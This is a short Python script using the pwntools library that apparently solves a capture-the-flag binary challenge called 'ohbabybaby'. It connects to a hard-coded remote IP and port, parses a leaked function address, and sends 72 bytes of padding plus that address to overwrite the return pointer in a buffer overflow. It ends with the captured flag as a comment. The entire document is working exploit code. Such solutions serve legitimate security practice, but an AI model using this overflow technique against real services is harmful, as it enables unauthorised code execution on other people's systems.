from pwn import *

bof = b"A"*72
conn = remote('185.14.184.242', '12990')
#conn = process('./ohbabybaby')
data = conn.recvuntil(".....................................Tap Tap to see your prize!!....................................\n").decode("utf-8")
print(data)
conn.sendline("A")   # so that we can see the address of ultimatePrize
data = conn.recvuntil("............................................Did you enjoy?..........................................").decode("utf-8")
conn.recvuntil("\n")
print(data)
address = "0x"+data.split("0x")[1][:12]
print(address)
conn.recvline()

try:
    conn.sendline(bof + p64(int(address, 16)))
    print(conn.recvall().decode("utf-8"))
except:
    print("error!\n")
    print(conn.recvall().decode("utf-8"))




# S4CTF{W311_D0n3_f0r_th3_3xpl0it_Vuln3rability_i5_aws0m3!!}